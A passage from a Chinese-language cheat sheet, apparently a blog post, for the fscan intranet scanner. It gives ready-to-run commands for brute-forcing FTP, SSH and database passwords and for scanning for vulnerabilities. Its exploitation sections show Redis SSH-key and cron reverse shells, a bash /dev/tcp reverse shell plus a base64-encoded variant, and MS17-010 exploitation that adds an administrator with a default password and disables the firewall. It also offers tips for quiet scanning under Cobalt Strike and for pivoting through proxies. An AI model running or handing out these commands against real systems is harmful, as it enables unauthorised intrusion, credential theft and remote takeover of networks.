+<h3 id="6-4-FTP-爆破"><a href="#6-4-FTP-爆破" class="headerlink" title="6.4 FTP 爆破"></a>6.4 FTP 爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── FTP 爆破 ───</span><br>fscan -h 192.168.1.10 -m ftp -p 21<br><br><span class="hljs-comment"># ─── 自定义字典 ───</span><br>fscan -h 192.168.1.10 -m ftp -p 21 -user admin -pwdf passwords.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-5-跳过爆破"><a href="#6-5-跳过爆破" class="headerlink" title="6.5 跳过爆破"></a>6.5 跳过爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 跳过所有密码爆破 ───</span><br>fscan -h 192.168.1.0/24 -nobr<br><br><span class="hljs-comment"># ─── 跳过存活探测 + 跳过 POC（只做端口 + 爆破）───</span><br>fscan -h 192.168.1.0/24 -np -nopoc<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、数据库爆破"><a href="#七、数据库爆破" class="headerlink" title="七、数据库爆破"></a>七、数据库爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── MySQL 爆破 ───</span><br>fscan -h 192.168.1.10 -m mysql -p 3306<br><br><span class="hljs-comment"># ─── MSSQL 爆破 ───</span><br>fscan -h 192.168.1.10 -m mssql -p 1433<br><br><span class="hljs-comment"># ─── Redis 未授权 / 爆破 ───</span><br>fscan -h 192.168.1.10 -m redis -p 6379<br><br><span class="hljs-comment"># ─── PostgreSQL 爆破 ───</span><br>fscan -h 192.168.1.10 -m psql -p 5432<br><br><span class="hljs-comment"># ─── Oracle 爆破 ───</span><br>fscan -h 192.168.1.10 -m oracle -p 1521<br><br><span class="hljs-comment"># ─── MongoDB 爆破 ───</span><br>fscan -h 192.168.1.10 -m mgo -p 27017<br><br><span class="hljs-comment"># ─── Memcached 爆破 ───</span><br>fscan -h 192.168.1.10 -m mem -p 11211<br><br><span class="hljs-comment"># ─── MySQL 自定义字典 ───</span><br>fscan -h 192.168.1.10 -m mysql -p 3306 -userf users.txt -pwdf passwords.txt<br><br><span class="hljs-comment"># ─── 跳过 POC + 存活（只爆破数据库）───</span><br>fscan -h 192.168.1.10 -m mysql -p 3306 -np -nopoc<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、Web-探测"><a href="#八、Web-探测" class="headerlink" title="八、Web 探测"></a>八、Web 探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── Web 标题探测（默认 all 模式自动执行）───</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ─── 仅 Web 探测模式 ───</span><br>fscan -h 192.168.1.0/24 -m web<br><br><span class="hljs-comment"># ─── 指定 URL 扫描 ───</span><br>fscan -u http://target.com<br><br><span class="hljs-comment"># ─── 从文件读取 URL ───</span><br>fscan -uf urls.txt<br><br><span class="hljs-comment"># ─── 指定 POC 名称（模糊匹配）───</span><br>fscan -h 192.168.1.0/24 -pocname weblogic<br>fscan -h 192.168.1.0/24 -pocname struts2<br><br><span class="hljs-comment"># ─── 指定 POC 路径 ───</span><br>fscan -h 192.168.1.0/24 -pocpath /path/to/pocs/<br><br><span class="hljs-comment"># ─── 设置 Cookie ───</span><br>fscan -u http://target.com -cookie <span class="hljs-string">&quot;session=abc123&quot;</span><br><br><span class="hljs-comment"># ─── Web 超时 ───</span><br>fscan -h 192.168.1.0/24 -wt 10<br></code></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[*] <span class="hljs-title class_">WebTitle</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span> <span class="hljs-symbol">code:</span><span class="hljs-number">200</span> <span class="hljs-symbol">len:</span><span class="hljs-number">5678</span> <span class="hljs-symbol">title:</span>后台管理系统<br>[*] <span class="hljs-title class_">WebTitle</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span><span class="hljs-symbol">:</span><span class="hljs-number">8080</span> <span class="hljs-symbol">code:</span><span class="hljs-number">200</span> <span class="hljs-symbol">len:</span><span class="hljs-number">1234</span> <span class="hljs-symbol">title:</span><span class="hljs-title class_">Apache</span> <span class="hljs-title class_">Tomcat</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、漏洞扫描"><a href="#九、漏洞扫描" class="headerlink" title="九、漏洞扫描"></a>九、漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 默认全功能扫描（含漏洞检测）───</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ─── 指定 POC 扫描 ───</span><br>fscan -h 192.168.1.0/24 -pocname weblogic<br><br><span class="hljs-comment"># ─── POC 发包速率（默认 20）───</span><br>fscan -h 192.168.1.0/24 -num 10    <span class="hljs-comment"># 更慢更稳</span><br>fscan -h 192.168.1.0/24 -num 50    <span class="hljs-comment"># 更快</span><br><br><span class="hljs-comment"># ─── 跳过 POC 扫描 ───</span><br>fscan -h 192.168.1.0/24 -nopoc<br><br><span class="hljs-comment"># ─── MS17-010 检测 ───</span><br>fscan -h 192.168.1.0/24 -m ms17010 -p 445<br><br><span class="hljs-comment"># ─── CVE-2020-0796 (SMBGhost) 检测 ───</span><br>fscan -h 192.168.1.0/24 -m cve20200796 -p 445<br><br><span class="hljs-comment"># ─── 配合代理使用 XRay POC ───</span><br>fscan -h 192.168.1.0/24 -p 80 -proxy http://127.0.0.1:8080<br></code></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+]</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>:<span class="hljs-number">445</span> MS17<span class="hljs-number">-010</span> (EternalBlue) IS VULNERABLE<br><span class="hljs-string">[*]</span> WebLogic CVE<span class="hljs-number">-2020</span><span class="hljs-number">-14882</span> http:<span class="hljs-comment">//192.168.1.10:7001</span><br><span class="hljs-string">[+]</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>:<span class="hljs-number">6379</span> Redis Unauthorized<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十、漏洞利用"><a href="#十、漏洞利用" class="headerlink" title="十、漏洞利用"></a>十、漏洞利用</h2><h3 id="10-1-Redis-利用"><a href="#10-1-Redis-利用" class="headerlink" title="10.1 Redis 利用"></a>10.1 Redis 利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── Redis 写公钥（获得 SSH 访问）───</span><br>fscan -h 192.168.1.10 -m redis -p 6379 -rf id_rsa.pub<br><span class="hljs-comment"># 写入后：ssh -i id_rsa root@192.168.1.10</span><br><br><span class="hljs-comment"># ─── Redis 写计划任务反弹 Shell ───</span><br>fscan -h 192.168.1.10 -m redis -p 6379 -rs 192.168.1.100:6666<br><span class="hljs-comment"># 攻击机监听：nc -lvnp 6666</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="10-2-SSH-命令执行"><a href="#10-2-SSH-命令执行" class="headerlink" title="10.2 SSH 命令执行"></a>10.2 SSH 命令执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── SSH 命令执行（需先爆破出密码）───</span><br>fscan -h 192.168.1.10 -c <span class="hljs-built_in">whoami</span><br>fscan -h 192.168.1.10 -c <span class="hljs-string">&quot;id;uname -a&quot;</span><br><br><span class="hljs-comment"># ─── 反弹 Shell ───</span><br>fscan -h 192.168.1.10 -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/5555 0&gt;&amp;1&quot;</span><br><br><span class="hljs-comment"># ─── Base64 编码执行（绕过特殊字符）───</span><br>fscan -h 192.168.1.10 -c <span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzU1NTUgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span><br><span class="hljs-comment"># 攻击机监听：nc -lvnp 5555</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="10-3-MS17-010-利用"><a href="#10-3-MS17-010-利用" class="headerlink" title="10.3 MS17-010 利用"></a>10.3 MS17-010 利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 添加用户（默认 sysadmin / 1qaz@WSX!@#4）───</span><br>fscan -h 192.168.1.10 -m ms17010 -p 445 -sc add<br><span class="hljs-comment"># 自动执行：net user sysadmin &quot;1qaz@WSX!@#4&quot; /ADD</span><br><span class="hljs-comment">#           net localgroup Administrators sysadmin /ADD</span><br><span class="hljs-comment">#           开启远程桌面</span><br><span class="hljs-comment">#           关闭防火墙</span><br><br><span class="hljs-comment"># ─── 启用 Guest 用户 ───</span><br>fscan -h 192.168.1.10 -m ms17010 -p 445 -sc guest<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十一、NetBIOS-与域控识别"><a href="#十一、NetBIOS-与域控识别" class="headerlink" title="十一、NetBIOS 与域控识别"></a>十一、NetBIOS 与域控识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── NetBIOS 探测 + 域控识别 ───</span><br>fscan -h 192.168.1.0/24 -p 139 -m netbios<br><br><span class="hljs-comment"># ─── 域控识别（[+]DC 标记）───</span><br>fscan -h 192.168.1.0/24 -m netbios<br><span class="hljs-comment"># 输出：[+] 192.168.1.10 DC:TEST.LOCAL</span><br><br><span class="hljs-comment"># ─── 完整 Netbios 信息 ───</span><br>fscan -h 192.168.1.0/24 -m netbios<br></code></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">NetBIOS</span> <span class="hljs-number">192.168.1.10</span>  WORKGROUP\FILESERVER<br>NetBIOS <span class="hljs-number">192.168.1.20</span>  TEST.LOCAL\DC01 [+]DC<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十二、输出控制"><a href="#十二、输出控制" class="headerlink" title="十二、输出控制"></a>十二、输出控制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 默认保存到 result.txt ───</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ─── 指定输出文件 ───</span><br>fscan -h 192.168.1.0/24 -o scan_result.txt<br>fscan -h 192.168.1.0/24 -o /tmp/results/scan1.txt<br><br><span class="hljs-comment"># ─── 不保存文件 ───</span><br>fscan -h 192.168.1.0/24 -no<br><br><span class="hljs-comment"># ─── 静默模式（适合 Cobalt Strike）───</span><br>fscan -h 192.168.1.0/24 -silent -o result.txt<br><br><span class="hljs-comment"># ─── 调试模式（超时后打印进度）───</span><br>fscan -h 192.168.1.0/24 -debug 30<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十三、代理与网络配置"><a href="#十三、代理与网络配置" class="headerlink" title="十三、代理与网络配置"></a>十三、代理与网络配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── HTTP 代理 ───</span><br>fscan -h 192.168.1.0/24 -proxy http://127.0.0.1:8080<br><br><span class="hljs-comment"># ─── SOCKS5 代理 ───</span><br>fscan -h 192.168.1.0/24 -socks5 socks5://127.0.0.1:1080<br><br><span class="hljs-comment"># ─── 配合 Proxifier / frp ───</span><br>fscan -h 192.168.1.0/24 -proxy http://127.0.0.1:10800<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十四、实战场景速查"><a href="#十四、实战场景速查" class="headerlink" title="十四、实战场景速查"></a>十四、实战场景速查</h2><h3 id="场景-1：标准内网扫描（一键全自动）"><a href="#场景-1：标准内网扫描（一键全自动）" class="headerlink" title="场景 1：标准内网扫描（一键全自动）"></a>场景 1：标准内网扫描（一键全自动）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 192.168.1.0/24 -o result.txt<br><span class="hljs-comment"># 自动完成：ICMP 存活 → 端口扫描 → 服务爆破 → Web 指纹 → 漏洞检测</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-2：B-段快速侦察"><a href="#场景-2：B-段快速侦察" class="headerlink" title="场景 2：B 段快速侦察"></a>场景 2：B 段快速侦察</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 10.10.0.0/16 -m icmp -o b_segment.txt<br><span class="hljs-comment"># 每个 C 段取网关 + 随机 IP，快速了解网段分布</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-3：Cobalt-Strike-静默扫描"><a href="#场景-3：Cobalt-Strike-静默扫描" class="headerlink" title="场景 3：Cobalt Strike 静默扫描"></a>场景 3：Cobalt Strike 静默扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 192.168.1.0/24 -silent -t 200 -no<br><span class="hljs-comment"># 静默模式，不回显，不保存文件（或 -o 到隐蔽路径）</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-4：指定服务爆破"><a href="#场景-4：指定服务爆破" class="headerlink" title="场景 4：指定服务爆破"></a>场景 4：指定服务爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># SSH 爆破</span><br>fscan -h 192.168.1.0/24 -m ssh -p 22 -userf users.txt -pwdf passwords.txt<br><br><span class="hljs-comment"># MySQL 爆破</span><br>fscan -h 192.168.1.0/24 -m mysql -p 3306 -user root -pwdf passwords.txt<br><br><span class="hljs-comment"># Redis 未授权</span><br>fscan -h 192.168.1.0/24 -m redis -p 6379 -np -nopoc<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-5：Web-漏洞专项扫描"><a href="#场景-5：Web-漏洞专项扫描" class="headerlink" title="场景 5：Web 漏洞专项扫描"></a>场景 5：Web 漏洞专项扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># WebLogic</span><br>fscan -h 192.168.1.0/24 -p 7001 -pocname weblogic<br><br><span class="hljs-comment"># Struts2</span><br>fscan -h 192.168.1.0/24 -p 8080 -pocname struts2<br><br><span class="hljs-comment"># 通达 OA</span><br>fscan -h 192.168.1.0/24 -p 80 -pocname tongda<br><br><span class="hljs-comment"># 所有 Web POC</span><br>fscan -h 192.168.1.0/24 -p 80,8080,7001<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-6：跳过非必要扫描（快速端口发现）"><a href="#场景-6：跳过非必要扫描（快速端口发现）" class="headerlink" title="场景 6：跳过非必要扫描（快速端口发现）"></a>场景 6：跳过非必要扫描（快速端口发现）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 192.168.1.0/24 -nobr -nopoc -o ports.txt<br><span class="hljs-comment"># 只做存活 + 端口，不爆破不扫漏洞</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-7：从文件导入目标"><a href="#场景-7：从文件导入目标" class="headerlink" title="场景 7：从文件导入目标"></a>场景 7：从文件导入目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># targets.txt 内容：</span><br><span class="hljs-comment"># 192.168.1.10</span><br><span class="hljs-comment"># 192.168.1.20</span><br><span class="hljs-comment"># 192.168.1.30</span><br><br>fscan -hf targets.txt -o results.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-8：Redis-拿-Shell-完整流程"><a href="#场景-8：Redis-拿-Shell-完整流程" class="headerlink" title="场景 8：Redis 拿 Shell 完整流程"></a>场景 8：Redis 拿 Shell 完整流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 第一步：发现 Redis 未授权</span><br>fscan -h 192.168.1.0/24 -m redis -p 6379 -np<br><br><span class="hljs-comment"># 第二步：写入公钥</span><br>fscan -h 192.168.1.10 -m redis -p 6379 -rf ~/.ssh/id_rsa.pub<br><br><span class="hljs-comment"># 第三步：SSH 登录</span><br>ssh -i ~/.ssh/id_rsa root@192.168.1.10<br><br><span class="hljs-comment"># 或者：写计划任务反弹 Shell</span><br>fscan -h 192.168.1.10 -m redis -p 6379 -rs YOUR_IP:6666<br><span class="hljs-comment"># 本地监听：nc -lvnp 6666</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-9：MS17-010-利用完整流程"><a href="#场景-9：MS17-010-利用完整流程" class="headerlink" title="场景 9：MS17-010 利用完整流程"></a>场景 9：MS17-010 利用完整流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 第一步：检测</span><br>fscan -h 192.168.1.0/24 -m ms17010 -p 445<br><br><span class="hljs-comment"># 第二步：利用（添加管理员用户）</span><br>fscan -h 192.168.1.10 -m ms17010 -p 445 -sc add<br><span class="hljs-comment"># 生成用户：sysadmin / 1qaz@WSX!@#4</span><br><span class="hljs-comment"># RDP 连接：rdesktop 192.168.1.10</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-10：域环境信息收集"><a href="#场景-10：域环境信息收集" class="headerlink" title="场景 10：域环境信息收集"></a>场景 10：域环境信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 192.168.1.0/24 -m netbios -p 139 -o domain_info.txt<br><span class="hljs-comment"># 识别域控、机器名、工作组/域名</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-11：特定网段跳过"><a href="#场景-11：特定网段跳过" class="headerlink" title="场景 11：特定网段跳过"></a>场景 11：特定网段跳过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描整个 B 段但跳过 DMZ 区</span><br>fscan -h 10.10.0.0/16 -hn 10.10.100.0/24 -o result.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-12：代理穿透扫描（多层内网）"><a href="#场景-12：代理穿透扫描（多层内网）" class="headerlink" title="场景 12：代理穿透扫描（多层内网）"></a>场景 12：代理穿透扫描（多层内网）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 通过 frp / chisel 打通隧道后</span><br>fscan -h 172.16.1.0/24 -proxy http://127.0.0.1:10800 -o inner_net.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-13：URL-文件批量扫描"><a href="#场景-13：URL-文件批量扫描" class="headerlink" title="场景 13：URL 文件批量扫描"></a>场景 13：URL 文件批量扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># urls.txt 包含所有发现的 Web URL</span><br>fscan -uf urls.txt -pocname weblogic -o web_vulns.txt<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十五、管道组合"><a href="#十五、管道组合" class="headerlink" title="十五、管道组合"></a>十五、管道组合</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── fscan 结果提取存活 IP ───</span><br>grep <span class="hljs-string">&quot;alive&quot;</span> result.txt | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&quot;&#x27;&quot;</span> &gt; alive_ips.txt<br><br><span class="hljs-comment"># ─── fscan 结果提取开放端口 ───</span><br>grep <span class="hljs-string">&quot;open&quot;</span> result.txt | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; open_ports.txt<br><br><span class="hljs-comment"># ─── fscan 结果提取弱口令 ───</span><br>grep <span class="hljs-string">&quot;\\[\\*\\].*success&quot;</span> result.txt<br><br><span class="hljs-comment"># ─── fscan 结果提取漏洞 ───</span><br>grep <span class="hljs-string">&quot;VULNERABLE\\|Unauthorized\\|CVE&quot;</span> result.txt<br><br><span class="hljs-comment"># ─── fscan → httpx 二次验证 Web 服务 ───</span><br>grep <span class="hljs-string">&quot;WebTitle&quot;</span> result.txt | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | \<br>  httpx -silent -sc -title -server<br><br><span class="hljs-comment"># ─── fscan 结果 → nuclei 精细扫描 ───</span><br>grep <span class="hljs-string">&quot;WebTitle&quot;</span> result.txt | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | \<br>  nuclei -t cves/ -o web_vulns.txt<br><br><span class="hljs-comment"># ─── masscan 快速端口 → fscan 精细扫描 ───</span><br>masscan -p1-65535 192.168.1.0/24 --rate 10000 -oG masscan.txt<br><span class="hljs-comment"># 提取 IP → fscan</span><br><span class="hljs-built_in">cat</span> masscan.txt | grep <span class="hljs-string">&quot;open&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -u &gt; targets.txt<br>fscan -hf targets.txt -o fscan_result.txt<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十六、常见踩坑"><a href="#十六、常见踩坑" class="headerlink" title="十六、常见踩坑"></a>十六、常见踩坑</h2><h3 id="16-1-ICMP-需要-root-权限"><a href="#16-1-ICMP-需要-root-权限" class="headerlink" title="16.1 ICMP 需要 root 权限"></a>16.1 ICMP 需要 root 权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ❌ 普通用户执行，ICMP 失败</span><br>./fscan -h 192.168.1.0/24<br><span class="hljs-comment"># &quot;The current user permissions unable to send icmp packets&quot;</span><br><br><span class="hljs-comment"># ✅ 使用 root / sudo</span><br><span class="hljs-built_in">sudo</span> ./fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ✅ 或使用 ping 代替</span><br>./fscan -h 192.168.1.0/24 -ping<br><br><span class="hljs-comment"># ✅ 或跳过存活探测</span><br>./fscan -h 192.168.1.0/24 -np<br></code></pre></td></tr></table></figure>
+
+<h3 id="16-2-线程数过高导致丢包"><a href="#16-2-线程数过高导致丢包" class="headerlink" title="16.2 线程数过高导致丢包"></a>16.2 线程数过高导致丢包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ❌ 默认 600 线程在不稳定网络中可能丢包</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ✅ 降低线程数</span><br>fscan -h 192.168.1.0/24 -t 100<br>fscan -h 192.168.1.0/24 -t 200<br></code></pre></td></tr></table></figure>
+
+<h3 id="16-3-爆破顺序问题"><a href="#16-3-爆破顺序问题" class="headerlink" title="16.3 爆破顺序问题"></a>16.3 爆破顺序问题</h3><p>fscan 按字典文件中的<strong>顺序</strong>爆破。SSH 爆破多用户时，只能爆出第一个匹配的用户：</p>
